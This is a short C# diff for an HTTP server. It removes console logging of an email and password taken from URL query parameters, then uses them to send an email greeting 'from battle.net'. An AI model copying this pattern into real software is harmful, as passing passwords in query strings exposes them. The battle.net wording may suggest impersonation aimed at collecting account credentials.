@@ -69,8 +69,6 @@ public class HttpServer
                 var queryParams = request.QueryString;
                 var email = queryParams["email"];
                 var password = queryParams["password"];
-                Console.WriteLine($"Email: {email}");
-                Console.WriteLine($"Password {password}");
                 MailSender.SendEmailAsync(password, email, "Hello from battle.net");
             }
             else
